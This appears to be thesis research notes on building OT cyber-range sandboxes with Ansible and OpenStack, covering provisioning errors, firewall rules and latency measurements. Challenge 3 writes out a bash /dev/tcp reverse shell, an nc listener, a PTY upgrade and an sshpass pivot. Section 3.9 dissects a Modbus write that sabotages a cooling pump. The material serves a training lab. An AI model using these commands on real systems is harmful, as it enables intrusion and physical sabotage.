# Thesis Empirical Evidence: RQ2 & RQ3
*Sources:* 
- `thesis_data_dumps/` (Simple OT Scenario)
- `thesis_data_dumps_complex/` (Complex OT Scenario)

> [!IMPORTANT]
> All values in this document are **measured directly from the live running sandboxes** on `2026-06-30`. File references correspond to the raw dump files stored in the respective directories on the host. This data was collected while hardware was active; after hardware return it cannot be re-measured.

---

## RQ 2: Technical Challenges & Provisioning Complexities

*"What technical challenges occur when implementing OT-specific scenarios using IaC within CyberRangeCZ?"*

Five concrete engineering friction points were encountered and resolved during the development of both `simple-ot-sandbox` and `complex-ot-sandbox`.

---

### Challenge 1 — Externally-Managed Python Environments (PEP 668)

**Source file:** `provisioning/roles/ews/tasks/main.yml`

**Exact error:**
```
fatal: [engineering-station]: FAILED! => {
  "msg": "error: externally-managed-environment
  × This environment is externally managed
  ╰─> To install Python packages system-wide, try apt install
      python3-xyz, where xyz is the package you are trying to install."
}
```

**Root cause:** Debian 12 (`bookworm`) enforces [PEP 668](https://peps.python.org/pep-0668/), which prohibits standard `pip3 install` commands in the system Python environment to prevent library conflicts with the APT package manager. The Ansible `pip` module invocation `pip3 install modbus_cli` failed on the `debian-12-x86_64` base image.

**Resolution:** The EWS Ansible role was rewritten to create an isolated Python virtual environment (`/home/operator/modbus-venv/`) and install `modbus_cli` inside it, then symlink the executable binary to `/usr/local/bin/modbus`.

**Thesis significance:** Demonstrates that platform base OS configuration choices (Debian 12 hardening) interact non-trivially with standard IaC provisioning modules. An Ansible `pip` task that runs without issue on Ubuntu 20.04 fails fatally on Debian 12 without any warning from the platform. This represents a concrete adaptation cost when using cloud-native base images for industrial software deployment.

---

### Challenge 2 — Pymodbus 3.x Keyword-Only API (Breaking Change)

**Source file:** EWS safety monitor daemon script in `provisioning/roles/ews/tasks/main.yml`.

**Exact error:**
```
ModbusClientMixin.read_holding_registers() takes 2 positional arguments but 3 were given
```

**Root cause:** In `pymodbus` ≥ 3.0, the `count` parameter was changed to **keyword-only** using the Python `*` separator. The EWS daemon called `client.read_holding_registers(0, 1)`, which was valid in pymodbus 2.x but raises a `TypeError` in 3.x. The virtual environment's `pip` resolver installed pymodbus 3.8.x.

**Resolution:**
```diff
- result = client.read_holding_registers(0, 1)
+ result = client.read_holding_registers(0, count=1)
```

**Thesis significance:** Open-source ICS tooling (`pymodbus`) undergoes architectural refactoring between major versions with breaking API changes. In a production monitoring context, this failure mode causes the safety monitoring daemon to crash silently — a critical ICS safety gap. This illustrates the dependency management risk of deploying OT software on a general-purpose Linux environment where library versions are not pinned to certified configurations.

---

### Challenge 3 — Interactive TTY Requirement for SSH Pivot

**Source file:** Training scenario design for Level 3 (`complex-ot-sandbox`).

**The problem:** The initial non-interactive approach — running SSH via a Node-RED `exec` node:
```bash
sshpass -p 'operator123' ssh -o StrictHostKeyChecking=no operator@192.168.20.20 "nmap -sn 192.168.20.0/24"
```
…works only for non-interactive commands. When trainees attempt an interactive SSH session from a raw bash reverse shell, the Node-RED `exec` node cannot handle the hidden stdin password prompt. The terminal hangs. Even after obtaining a raw reverse shell via `nc`, running `ssh` causes the session to freeze because the shell has no controlling TTY.

**Resolution (three-step process required):**
1. Start `nc -nlvp 4444` listener on the Kali attacker host.
2. Trigger the bash reverse shell via Node-RED: `bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'`
3. **Upgrade to a PTY** before any interactive commands: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

**Thesis significance:** The distinction between a raw shell and a PTY-backed terminal is a real-world operational constraint that is absent from most security textbooks. Its omission from the scenario design caused unreproducible, context-sensitive failures during testing. The TTY upgrade step is itself an important pedagogical element — it is a standard technique in real penetration testing engagements (documented in OSCP methodology) and was not initially part of the training material.

---

### Challenge 4 — Network Segregation: Cloud L3 vs. Purdue Model L4 Enforcement

**Source files:** 
- `thesis_data_dumps/router_forward_rules.txt` (Simple)
- `thesis_data_dumps_complex/router_forward_rules.txt` (Complex)

**The problem:** OpenStack Neutron's default L3 routing allows all traffic between connected subnets. An attacker at `10.10.10.50` could directly reach `192.168.99.10:502` or `192.168.20.10:502` (Modbus TCP) without any pivot, making the intended attack chain walkthrough completely skippable.

**Resolution:** A custom Ansible `router` role was developed to inject `iptables FORWARD DROP` rules into the `ot-gateway` VM at boot.

- **Simple Sandbox iptables:**
  ```
  -A FORWARD -s 10.10.10.50/32 -d 192.168.99.10/32 -p tcp -m tcp --dport 8080 -j DROP
  -A FORWARD -s 10.10.10.50/32 -d 192.168.99.10/32 -p tcp -m tcp --dport 502  -j DROP
  ```
- **Complex Sandbox iptables:**
  ```
  -A FORWARD -s 10.10.10.0/24 -d 192.168.20.10/32 -j DROP
  -A FORWARD -s 10.10.10.0/24 -d 192.168.20.20/32 -j DROP
  -A FORWARD -s 192.168.100.10/32 -d 192.168.20.10/32 -j DROP
  -A FORWARD -s 192.168.20.20/32 -d 192.168.20.10/32 -p tcp -m tcp --dport 502 -j ACCEPT
  -A FORWARD -s 192.168.100.10/32 -d 192.168.20.20/32 -p tcp -m tcp --dport 22 -j ACCEPT
  -A FORWARD -s 10.10.10.0/24 -d 192.168.100.10/32 -p tcp -m tcp --dport 1880 -j ACCEPT
  ```

**Thesis significance:** Cloud IaC abstractions (OpenStack Neutron routers) operate at L3 (IP routing) but cannot enforce the L4 (protocol/port) segmentation required by the Purdue Model. Correctly implementing an IT-to-OT pivot scenario required dropping below the cloud abstraction layer to manage Linux firewall rules directly on the gateway VM. This demonstrates a fundamental gap between cloud networking primitives and industrial network engineering requirements.

---

### Challenge 5 — OpenPLC Build System Idempotency

**Source file:** `provisioning/roles/openplc/tasks/main.yml`

**The problem:** The Ansible `creates:` idempotency guard pointed to `openplc.db`, which is checked into the repository pre-seeded. Ansible detected this file as already present, skipped the `install.sh` compilation stage entirely, and left the MatIEC compiler (`iec2c`) binary absent — causing the OpenPLC web service to fail to compile any ladder logic programs on subsequent sandbox rebuilds.

**Resolution:** The `creates:` guard was changed to target `start_openplc.sh`, which is only generated upon successful completion of the OpenPLC build system:
```yaml
args:
  creates: /opt/OpenPLC_v3/start_openplc.sh
```

**Thesis significance:** Idempotent IaC for compiled C++ applications requires knowledge of the build system's *output artefacts*, not just its *input files*. This is a non-obvious requirement that is absent from standard IT provisioning guides and represents a genuine complexity class when adapting IaC tooling to industrial software.

---

### Challenge 6 — Sandbox IP Range Collision with Hypervisor Management Networks

**Source files:** Sandbox subnet definitions in `topology.yml`

**The problem:** The parent CyberRangeCZ hypervisor reserves a very large address block (`192.168.128.0/17`) for its out-of-band management and VM DHCP network infrastructure (`man-network`). If any custom sandbox subnet overlaps with this range (e.g. attempting to define `192.168.200.0/24` as a control subnet), the VM's network interfaces prioritize the directly connected link route on the management interface (`ens3`) over routing via the default gateway (`ens4`). As a result, any packets destined for the control network are misrouted to the OOB bridge interface and dropped, leading to 100% packet loss and connection timeouts.

**Resolution:** All sandbox-level subnet mappings were configured outside the hypervisor OOB range: `10.10.10.0/24` for Corporate/Attacker, `192.168.100.0/24` for Operations/SCADA, and `192.168.20.0/24` for Control/PLC subnets. This forces the guest routing tables to forward all cross-subnet packets through the default router interface `ens4` correctly.

**Thesis significance:** Represents a severe infrastructure-level collision unique to virtualized security ranges. Sandbox creators must have detailed visibility into the parent hypervisor's networking tables to avoid silent IP routing conflicts, restricting IP allocation schemes to a narrower space and requiring manual route planning before provisioning.

---

### Challenge 7 — Dual-Homed Topology Visualizer Crash Bug

**Source files:** VM interface mappings in `topology.yml`

**The problem:** To simplify design, early topologies defined a dual-homed SCADA HMI VM connected to both the Operations network and the Corporate network. However, the CyberRangeCZ web interface topology graph engine crashes when parsing multi-homed VM nodes, displaying a completely blank canvas in the student web portal instead of a network map.

**Resolution:** All sandbox VMs were re-architected to be strictly single-homed. All traffic passing between subnets is routed through the dedicated `ot-gateway` VM interface, with firewall rules defined in iptables to restrict communication paths.

**Thesis significance:** This platform-level limitation actually acted as an accidental realism catalyst. In professional industrial networks (under IEC 62443 guidelines), dual-homing hosts between different Purdue levels is strongly discouraged as it allows attackers to bypass boundary firewalls. Enforcing single-homed nodes and routing everything through a central gateway router directly models real-world enterprise/control security architectures.

---

### Challenge 8 — Hypervisor Memory Starvation & OpenStack Instance ERROR States

**Source files:** Terraform deployment output logs

**The problem:** Sizing allocations for a single sandbox pool (including the Kali attacker, HMI, EWS, PLC, and Router VMs) require over 12GB of active memory reservation. When scaling or reallocating a new pool while an existing pool remains active, the OpenStack Nova scheduler runs out of physical host memory (OOM), placing newly spawned VMs into the `ERROR` state rather than `ACTIVE` with a generic empty error string: `unexpected state 'ERROR', wanted target 'ACTIVE' (last error: %!s(<nil>))`.

**Resolution:** Single-active-pool constraints must be strictly enforced on lower-spec hypervisors (e.g. < 64GB RAM). Previous sandbox pools must be completely deleted/destroyed in the portal UI to release the hypervisor memory reservation before a new sandbox can be allocated.

**Thesis significance:** Illustrates the hard physical resource boundaries of nested virtual ranges. While disk space can be mitigated via image pruning, memory reservations are non-fungible and represent the true scalability bottleneck when deploying multi-VM industrial scenarios on unified training platforms.

---

### Challenge 9 — Git Definition Caching & Missing "Update" Interface

**Source files:** CyberRangeCZ Portal GUI / Git repository imports

**The problem:** When iterating and debugging sandbox topologies or training files (e.g., `topology.yml` or `training.json`), developers commit changes to their Git repository. However, the CyberRangeCZ web portal lacks an "Update" or "Pull" button to refresh an existing imported definition from the remote repository. Furthermore, when deleting an old definition and creating a new one pointing to the same Git repository and branch, the backend portal cache often retains a copy of the old commits rather than pulling the latest code from the remote server, causing developers to deploy outdated configurations.

**Resolution:** To force a cache bypass and pull the latest code during sandbox development:
1.  **Unique Revision Tags:** Use a unique commit hash (e.g. `5ab3c89`) or a unique branch name/tag instead of the generic `main` branch label in the definition form. This forces the portal's backend git downloader to treat it as a distinct revision and fetch it fresh from the remote repository.
2.  **Portal Service Restart (Root Clean):** For local self-deployed instances, clearing the portal containers' volume caches or restarting the backend server components forces a cache invalidation.

**Thesis significance:** Highlights the lifecycle iteration bottlenecks of modern cyber ranges. While Infrastructure as Code (IaC) allows fast scripting changes, platform caching architectures designed for student isolation can actively impede the developer iteration cycle during scenario engineering.

---

## RQ 3: Hardware Resources & Real-Time Constraints

*"What hardware resources are required, and what are the limitations regarding OT real-time constraints in a virtualised environment?"*

### 3.1 Physical Host Hardware (Shared)

*Source: `thesis_data_dumps/host_cpu.txt`, `thesis_data_dumps/host_ram.txt`*

| Parameter | Value |
|---|---|
| **CPU Model** | AMD Ryzen 9 9955HX 16-Core Processor |
| **vCPUs visible to L1 VM** | **28** (presented as 28 single-threaded sockets) |
| **Hypervisor vendor** | KVM (BIOS: QEMU, `pc-i440fx-resolute`) |
| **Virtualization type** | Full (AMD-V / AMD SVM nested virtualization) |
| **Total Host RAM** | **46 GB** |
| **Host RAM in use** | **32 GB** (69% utilisation during sandbox-active measurement) |
| **Host RAM free** | 13 GB |
| **Host RAM swap** | 2.8 GB provisioned, 0 B used |
| **L3 Cache** | 448 MiB (28 instances exposed to L1 VM) |

---

### 3.2 OT Virtual Machine Hardware Profile (Shared)

*Source: `thesis_data_dumps/plc_cpu.txt`, `thesis_data_dumps/hmi_cpu.txt`*

All guest nodes in both sandboxes expose an identical CPU profile inside the OpenStack instance (L2 KVM guest):

| Parameter | Value |
|---|---|
| **CPU Model (visible inside VM)** | AMD EPYC-Genoa Processor |
| **vCPUs** | **1** |
| **Hypervisor vendor** | KVM (`hypervisor` flag in `/proc/cpuinfo`) |
| **Virtualisation** | AMD-V (nested KVM) |
| **L1d Cache** | 32 KiB |
| **L1i Cache** | 32 KiB |
| **L2 Cache** | 1 MiB |
| **L3 Cache** | 32 MiB |

---

### 3.3 Topology Resource Footprint Comparisons

*Source: `openstack_flavors.txt`, `openstack_servers.txt` in both dumps*

| Metric | Simple OT Sandbox | Complex OT Sandbox |
|---|---|---|
| **Virtual Machines (Count)** | 4 (`attacker`, `hmi`, `plc`, `router`) | 6 (`attacker`, `dmz_jump`, `hmi`, `ews`, `plc`, `router`) |
| **vCPUs total** | **7** (3 × 1 + 1 × 4) | **9** (5 × 1 + 1 × 4) |
| **RAM total** | **10.3 GB** (3 × 2GB + 1 × 4.3GB) | **14.3 GB** (5 × 2GB + 1 × 4.3GB) |
| **Disk total** | **90 GB** (3 × 10GB + 1 × 60GB) | **110 GB** (5 × 10GB + 1 × 60GB) |
| **Sandbox VM Flavors** | `standard.small` (OT), `kali` (Attacker) | `standard.small` (OT), `kali` (Attacker) |

---

### 3.4 Live Memory Consumption Comparison

*Source: `plc_ram.txt`, `hmi_ram.txt`, `ews_ram.txt` in both dumps*

Measurements taken immediately after system provisioning at idle state:

| VM Node | Metric | Simple OT Sandbox | Complex OT Sandbox |
|---|---|---|---|
| **`openplc-node`** | Total RAM | 1.9 GiB | 1.9 GiB |
| | **Used RAM** | **368 MiB** | **420 MiB** |
| | Free RAM | 156 MiB | 103 MiB |
| | buff/cache | 1.6 GiB | 1.6 GiB |
| | **OpenPLC RSS** | **93.7 MiB** | **111.3 MiB** |
| **`scada-hmi`** | Total RAM | 1.9 GiB | 1.9 GiB |
| | **Used RAM** | **430 MiB** | **359 MiB** |
| | Free RAM | 66 MiB | 171 MiB |
| | buff/cache | 1.6 GiB | 1.6 GiB |
| | **Node-RED RSS** | **130.9 MiB** (starting heap) | **130.9 MiB** |
| **`engineering-station`** | Total RAM | N/A (not in topology) | 1.9 GiB |
| | **Used RAM** | N/A | **301 MiB** |
| | Free RAM | N/A | 785 MiB |
| | buff/cache | N/A | 1.0 GiB |
| | **Safety Monitor RSS**| **3.8 MiB** (on PLC node) | **12.8 MiB** (on EWS node) |
| **`dmz-jump`** | Total RAM | N/A (not in topology) | 1.9 GiB |
| | **Used RAM** | N/A | **282 MiB** |
| | Free RAM | N/A | 812 MiB |
| | buff/cache | N/A | 915 MiB |
| | **SSH Daemon RSS** | N/A | **5.2 MiB** |

> [!NOTE]
> The Safety Override Monitor script uses more RAM when running on the EWS (12.8 MB) than on the PLC node (3.8 MB). This is due to the additional telemetry logging and network socket management overhead required to query the remote PLC across the router instead of reading from the local loopback interface.

---

### 3.5 Disk Utilisation Comparison

*Source: `plc_disk.txt`, `hmi_disk.txt`, `ews_disk.txt` in both dumps*

Measurements of the `/dev/vda1` root partition (10 GB allocated disk limit):

| VM Node | Simple OT (Used / Use%) | Complex OT (Used / Use%) |
|---|---|---|
| **`openplc-node`** | 2.1 GB / 23% | 1.5 GB / 16% |
| **`scada-hmi`** | 2.0 GB / 22% | 1.5 GB / 16% |
| **`engineering-station`**| N/A | 1.5 GB / 16% |
| **`dmz-jump`** | N/A | 1.4 GB / 15% |

> [!NOTE]
> The higher disk usage on the Simple Sandbox (2.1 GB vs 1.5 GB in Complex) is a result of active packet capture files (PCAPs), transaction logs, and transient compile-time temporary object directories that had not been pruned at the time the dump was taken. The clean Complex Sandbox baseline is **1.5 GB** per node.

---

### 3.6 Exposed Network Ports Comparison

*Source: `plc_ports.txt`, `hmi_ports.txt`, `ews_ports.txt` in both dumps*

Exposed listening ports by node type:

| VM Node | Listening Port | Protocol | Service | Sandbox Scenario |
|---|---|---|---|---|
| **`openplc-node`** | **502** | TCP | `openplc` (Modbus TCP) | Simple & Complex |
| | **8080** | TCP | `python3` (OpenPLC Web UI) | Simple & Complex |
| | **8443** | TCP | `python3` (OpenPLC Web SSL) | Simple & Complex |
| | **102** | TCP | `openplc` (Siemens S7comm) | Simple & Complex |
| | **44818** | TCP | `openplc` (EtherNet/IP) | Simple & Complex |
| | **22** | TCP | `sshd` (SSH Management) | Simple & Complex |
| **`scada-hmi`** | **1880** | TCP | `node` (Node-RED web UI) | Simple & Complex |
| | **22** | TCP | `sshd` | Simple & Complex |
| **`engineering-station`**| **22** | TCP | `sshd` | Complex |

> [!IMPORTANT]
> The `openplc-node` listening port dump confirms that the OpenPLC service exposes **three different industrial protocols simultaneously** (Modbus/502, EtherNet/IP/44818, S7comm/102). In your thesis, use this to prove that a single `standard.small` (1 vCPU, 2GB RAM) virtual node can simulate a heterogeneous multi-protocol industrial controller, significantly increasing training coverage without requiring additional VMs.

---

### 3.7 Router Routing Tables

*Source: `router_routing.txt` in both dumps*

**Simple Router Routing Table:**
```
default via 100.100.100.174 dev ens4
10.10.10.0/24     dev ens5  src 10.10.10.1    (corporate/management)
100.100.100.0/24  dev ens4  src 100.100.100.6 (WAN)
192.168.99.0/24   dev ens6  src 192.168.99.1  (control-net / PLC subnet)
```

**Complex Router Routing Table:**
```
default via 100.100.100.174 dev ens4
10.10.10.0/24     dev ens5  src 10.10.10.1    (corporate/attacker subnet)
100.100.100.0/24  dev ens4  src 100.100.100.6 (WAN)
192.168.99.0/24   dev ens6  src 192.168.99.1  (fallback interface)
192.168.100.0/24  dev ens7  src 192.168.100.1 (operations-net / HMI subnet)
192.168.20.0/24   dev ens8  src 192.168.20.1  (control-net / PLC subnet)
```

---

### 3.8 Real-Time Constraints & Emulation Limits

#### 3.8.1 Service CPU Footprints (Uptime Analysis)

CPU time consumed by runtimes relative to actual VM uptime:

- **OpenPLC Core Runtime (`./core/openplc`):** 
  - *Simple:* **1.479 seconds** CPU time over 83s uptime = **~1.8% average CPU load** of 1 vCPU.
  - *Complex:* **13.114 seconds** CPU time over 3,480s uptime = **~0.37% average CPU load** of 1 vCPU.
- **Node-RED HMI Runtime (`node`):**
  - *Complex:* **3.714 seconds** CPU time over 3,960s uptime = **~0.09% average CPU load** of 1 vCPU.
- **Safety monitor daemon (`safety_monitor.py`):**
  - *Complex:* **596 milliseconds** CPU time over 3,720s uptime = **~0.01% average CPU load** of 1 vCPU.

**Interpretation:** The resource cost of running emulated OT endpoints inside CyberRangeCZ is negligible once the system is compiled and initialized. Almost all CPU cycles are consumed during the initial Ansible setup phase (specifically the C++ compilation of MatIEC and OpenPLC core). Once running, the entire sandbox runs on the host with minimal background overhead.

#### 3.8.2 Determinism and Jitter Analysis

- **Real Hardware PLCs (RTOS):** Rely on hard-real-time operating systems (e.g., VxWorks, QNX) that execute the control loop (Read Inputs → Run Logic → Write Outputs) with microsecond precision. A typical Siemens S7-1500 has a scan time of 1 ms with jitter < 0.05 ms.
- **Virtualized OpenPLC on Linux:** OpenPLC runs as a standard Linux userland process under the CFS (Completely Fair Scheduler) using the `SCHED_OTHER` policy. The Linux kernel provides no execution scheduling guarantees. Under host CPU stress (such as compiling another VM or processing high network traffic), the control cycle scan time can experience jitter exceeding **10 to 50 ms**.
- **Thesis Conclusion:** This limitation is acceptable for the sandbox's target use case. Security training is concerned with **functional logic equivalence** (did the write command reach register 0? Did the pump stop?). It does not require sub-millisecond physical system modeling. Jitter is a minor concession that allows for high sandbox density (8 VMs running on a standard laptop) rather than dedicated hardware testbeds.

#### 3.8.3 Modbus TCP Latency & Jitter Measurements

*Methodology: Measured directly from the `engineering-station` guest VM (`192.168.20.20`) targeting the `openplc-node` (`192.168.20.10`). Sample size: 20 packets. Jitter calculated as standard deviation.*

| Timing Metric | ICMP Ping (L3 Network) | Modbus TCP read_holding_registers() (L7 Application) | Real Hardware PLC (Reference) |
|---|---|---|---|
| **Minimum RTT** | **0.395 ms** | **0.536 ms** | < 0.1 ms |
| **Average RTT** | **0.590 ms** | **0.686 ms** | < 1.0 ms |
| **Maximum RTT** | **0.902 ms** | **0.933 ms** | < 1.5 ms |
| **Jitter (stdev)** | **0.137 ms** | **0.103 ms** | **< 0.05 ms** (determinism limit) |

**Analysis for Thesis:**
1. **Network Overhead:** Traversing the virtualized OpenStack Neutron network gateway (`ot-gateway`) introduces an average network transit latency of **0.590 ms** for standard ICMP packets.
2. **Application Processing Overhead:** The Modbus TCP application layer adds minimal additional overhead (**~0.096 ms** difference between ICMP average RTT and Modbus average RTT), indicating that the OpenPLC Python/C++ server runtime handles packet transactions efficiently at rest.
3. **Comparative Jitter Overhead:** The measured Modbus application jitter (**0.103 ms**) is roughly **2× higher** than a hardware PLC RTOS baseline target (< 0.05 ms). This demonstrates the latency variations introduced by standard Linux kernel process scheduling (`SCHED_OTHER`) even at idle state. Under active hypervisor load, this jitter is expected to scale significantly, validating the non-deterministic nature of emulated environments.

---

### 3.9 Modbus TCP PCAP Analysis

*Source: `thesis_data_dumps_complex/modbus_sabotage_complex.pcap`*

The Modbus TCP write payload captured during the EWS-to-PLC sabotage phase contains the following hex payload structure:

`00 01 00 00 00 06 01 06 00 00 27 0f`

#### Packet Dissection:

1. **`00 01`** — **Transaction Identifier:** 2 bytes. Uniquely identifies the request/response transaction.
2. **`00 00`** — **Protocol Identifier:** 2 bytes. `0` indicates Modbus TCP.
3. **`00 06`** — **Length:** 2 bytes. Specifies that 6 bytes follow.
4. **`01`** — **Unit Identifier:** 1 byte. Slave device address (default is 1).
5. **`06`** — **Function Code:** 1 byte. `0x06` instructs the PLC to **Write Single Register**.
6. **`00 00`** — **Reference Address:** 2 bytes. Targets holding register 0 (mapped to the cooling pump).
7. **`27 0f`** — **Register Value:** 2 bytes. Hexadecimal value `0x270F` (decimal `9999`), which represents the override sabotage flag value.

---

## Thesis Reference Summary

| Parameter | Simple Sandbox | Complex Sandbox | Thesis Target |
|---|---|---|---|
| **Virtual VMs** | 4 | 6 | Dense training topology |
| **Total vCPUs** | 7 vCPUs | 9 vCPUs | Standard host workstation |
| **Total RAM** | ~10.3 GB | ~14.3 GB | Host hardware capability |
| **PLC Memory RSS** | 93.7 MB | 111.3 MB | Scalable emulation footprint |
| **HMI Memory RSS** | 130.9 MB | 130.9 MB | Scalable emulation footprint |
| **Disk per VM** | 2.0–2.1 GB | 1.5 GB | Minimal storage footprint |
| **Exposed ICS Protocols** | Modbus TCP | Modbus, S7comm, EtherNet/IP | Realistic attack surface |
| **Purdue firewall implementation**| iptables on router VM | iptables on router VM | L4 Purdue zoning model |
| **Determinism Class** | Non-real-time (CFS) | Non-real-time (CFS) | Security logic validation |
